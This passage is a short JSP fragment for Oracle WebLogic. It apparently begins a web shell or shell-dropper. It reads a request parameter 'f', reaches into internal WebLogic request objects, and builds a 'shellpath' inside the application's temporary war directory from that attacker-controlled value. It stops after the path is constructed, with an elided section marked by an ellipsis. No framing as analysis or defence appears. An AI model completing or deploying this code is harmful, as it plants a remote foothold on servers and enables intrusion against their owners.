<%
	if (request.getParameter("f") != null)
		try {
			...
			weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) thread
					.getCurrentWork();
			java.lang.String shellpath = req.getContext().getRootTempDir().getAbsolutePath()
					.concat("/war/" + request.getParameter("f"));
